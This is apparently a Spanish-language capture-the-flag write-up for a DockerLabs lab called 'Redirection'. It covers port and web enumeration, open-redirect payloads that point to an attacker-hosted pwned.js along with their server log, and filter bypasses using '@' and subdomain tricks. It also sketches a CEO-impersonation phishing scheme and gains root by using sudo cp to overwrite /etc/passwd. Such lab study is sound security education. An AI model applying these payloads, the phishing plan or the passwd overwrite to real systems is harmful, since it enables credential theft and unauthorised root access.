- Tags: #Redirection #OpenRedirect
---
[Maquina Redirection](https://mega.nz/file/CYlRlTKI#CxDKcj_cdI3VRXkYb_6aLzxEbrjh80FKb_cDazfwouU) -> Máquina donde se incluyen distintos laboratorios vulnerables a la vulnerabilidad Open Redirect. No hay escalada de privilegios en esta máquina.

- ##### OpenRedirectVulnerablility:
- **@** Por si sola no es muy letal, Pero si se concatena con otras vulnerabilidades desatando su verdadero potencial:
- **Phishing** -> Un **OpenRedirect** Se puede emplear con un ataque de **phishing**, Imaginando que tenemos los correos electronicos de una compania y el dominio de la empresa el real legitimo, Como atacante montariamos una campana de phishing para que a todos los empleados les llegue un correo suplantando al **ceo** de la empresa, donde indicariamos que existe una brecha de segurida y que es urgente que todos los usuarios deben actualizar sus credenciales inmediatamente.
- **( DominioLegitimo = alexcorp.com )** y **( DominioFalso = alexcorp.es )** donde del dominio falso estara clonada toda la web perfectamente, donde definimos una seccion para inicio de sesion falsa, De forma que cuando les enviamos este correo y lo abran veran un panel donde pueden iniciar sesion o cambiar sus credenciales en el panel falso desarrollado por el atacante.
- **OpenRedirect** -> Aqui entra en juego este ataque donde metemos en el redirect el **DominioLegitimo** para una ves que alla ingresado sus credenciales en el **DominioFalso** los redirigimos al **DominioLegitimo**
- **Nota:** -> Si los usuarios no se percatan que es un domino falso seran redirigidos a un panel de atacante, Donde un atacante puede definir que las credenciales de las victimas se almacenen en texto claro en el servidor del atacante 

```bash
7z x redirection.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh redirection.tar # Desplegamos el laboratorio.
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el target
```

```bash
wichSystem.py 172.17.0.2 # Gracias al ttl determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos y Servicios:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-60000 # Detectamos puertos atraves de TCP
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

```bash
extractPorts allPorts # Parseamos la informacin mas relevante del escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Escaneo exhaustivo para determinar los servicios y las versiones que corren detras de estos puertos.
```

```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) # Servicio ssh expuesto
```

### Fase Enumeracion Web:
```bash
80/tcp open  http    Apache httpd 2.4.62 ((Debian)) # Servicio web expuesto
```

```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```

### Fase Explotacion:

##### Laboratorio 1:
**( 172.17.0.2/laboratorio1/ )** -> Tenemos este seccion donde nos aplica un redirect cuando le damos clic en el boton: **( Ir a citio )**
**( ctrl + u )** -> Mirando el codigo fuente podemos ver que se esta empleando un redirect: ( redirect.php?url=http://google.com ) del cual nos aprovechamos para ver como reacciona si copiamos este fragmento e formando la url de la siguiente manera:
```bash
172.17.0.2/laboratorio1/redirect.php?url=https://dockerlabs.es/ # Nos redirige con exito a donde nosotros queremos.
```

Tambien podemos realizar solicitudes a nuestro servidor de atacante donde, intente cargar un recurso que contenca codigo malicioso como en el siguiente ejemplo
```bash
python3 -m http.server 80 # Tenemos nuestro servidor de atacante en escucha

172.17.0.2/laboratorio1/redirect.php?url=http://192.168.100.24/pwned.js # Intentamos cargar el recurso ( pwned.js ) que en nuestro servidor de atacante debera existir

# Tendremos peticiones, Donde se intenta cargar el recuros, Pero como no lo hemos definido falla
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.24 - - [27/May/2025 22:53:58] code 404, message File not found
192.168.100.24 - - [27/May/2025 22:53:58] "GET /pwned.js HTTP/1.1" 404 -
```

Ahora que si si existiera entonces se ejecutaria el codigo que nosotros definamos como atacante.

##### Laboratorio 2:
```bash
172.17.0.2/laboratorio2/redirect.php?url=https://dockerlabs.es/ # Para el este caso si intentamos realizar lo mismo no nos lo permite ya que controla esta redireccion

Redirección no permitida. Solo puedes redirigirte a Google. # Aplica validaciones que impiden que controlemos este parametro: ( url )
```

###### 🔍 **Análisis de la URL: ( BurpSuite )**

`/laboratorio2/redirect.php?url=https://www.google.com@https://dockerlabs.es/`

1. **Estructura básica:**
    - El script `redirect.php` toma un parámetro `url` para redirigir al usuario.
    - El valor del parámetro es `https://www.google.com@https://dockerlabs.es/`.
        
2. **Uso del `@`:**
    - El símbolo `@` en una URL se utiliza normalmente para separar **credenciales** (usuario:contraseña) del dominio (ej: `http://user:pass@example.com`).
    - En este caso, se está explotando para engañar al servidor o al cliente, haciendo que el redireccionamiento se realice a `https://dockerlabs.es/` en lugar de a Google.
        
3. **¿Cómo se interpreta?**
    - Algunos sistemas mal configurados podrían interpretar todo lo que está **después del `@`** como el destino real del redireccionamiento.
    - Si el script `redirect.php` no valida/sanitiza correctamente la entrada, redirigiría a `https://dockerlabs.es/`.

**Nota** -> Del mismo modo podemos realizar solicitudes a nuestro servidor de atacante para intentar ejecutar codigo malicioso que nosotros definamos como instruccion

##### Laboratorio 3:
**Nota** -> No nos permite emplear la tecnica anterior ya que esta sanitizada:
```bash
172.17.0.2/laboratorio3/redirect.php?url=https://www.google.com@http://192.168.100.24/pwned.js # No permite la redireccion.
```

Despues de intentar varias formas que no tuvieron exito, Logramaos contaminar la url apuntanto al subdominio: Donde le inyectamos esta cadena para ver como reacciona la web **( test )**
```bash
172.17.0.2/laboratorio3/redirect.php?url=https://test.google.com # Logramos romper la validacion.
```

#### Fase Intrusion:
```bash
# Tenemos credenciales de acceso por ssh
Usuario: balu
Password: balulero
```

```bash
ssh-keygen -R 172.17.0.2 && ssh balu@172.17.0.2 # Nos conectamos por ssh
```

### Fase Escalada Privilegios:
```bash
ls -la / # Listando archivos desde la rais
```

```bash
find / -type f -user balu 2>/dev/null # 
find / -type d -user balu 2>/dev/null # Filtrando por directorios vemos que tenemos este archivo

/secret.bak #
```

```bash
cat /secret.bak 
balulito:balulerochingon # Tenemos las credenciales de otro usuario del sistema.
```

```bash
ls /home
balulito # Intentaremos conectarnos como este usuario.
```

```bash
su balulito # Migramos a este usuario: ( balulerochingon )
```

```bash
sudo -l

User balulito may run the following commands on b5bd7d85a1dd:
    (ALL) NOPASSWD: /bin/cp # Tenemos una via potencial del elevar privilegios
```

**Nota** -> Para este caso nos aprovecharemos que podemos usar el comando **cp** para crear una capia del contenido del **( /etc/passwd )**, Nos creareamos uno igual con todo el contenido pero elminando la: **( x )** del usuario **root**.
```bash
root::0:0:root:/root:/bin/bash
```

Una ves que le quitemos la **( x )** y logremos sustituir este archivo por el original, podremos conectarnos como **root** sin proporcionar contrasena.
```bash
file.txt # Archivo malicioso con el contenido del /etc/passwd

sudo /bin/cp file /etc/passwd # Logramos modificar el archivo.
```

```bash
su # Ahora tendremos una bash como root sin proporcionar contrasena.
```